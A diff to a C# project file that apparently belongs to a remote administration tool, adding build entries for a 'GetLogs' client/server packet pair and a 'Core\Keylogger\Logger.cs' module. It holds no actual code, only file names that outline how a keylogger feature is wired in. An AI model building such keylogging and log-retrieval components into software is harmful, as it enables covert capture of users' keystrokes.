@@ -68,6 +68,7 @@
     <Compile Include="Core\Packets\ClientPackets\DirectoryResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DownloadFileResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DrivesResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetLogsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetProcessesResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetStartupItemsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetSystemInfoResponse.cs" />
@@ -82,6 +83,7 @@
     <Compile Include="Core\Packets\ServerPackets\DownloadFile.cs" />
     <Compile Include="Core\Packets\ServerPackets\DownloadFileCanceled.cs" />
     <Compile Include="Core\Packets\ServerPackets\Drives.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetLogs.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetProcesses.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetStartupItems.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetSystemInfo.cs" />
@@ -192,6 +194,7 @@
     <Compile Include="Core\ProtoBuf\WireType.cs" />
     <Compile Include="Core\Helper\Helper.cs" />
     <Compile Include="Core\Information\GeoIP.cs" />
+    <Compile Include="Core\Keylogger\Logger.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Config\Settings.cs" />
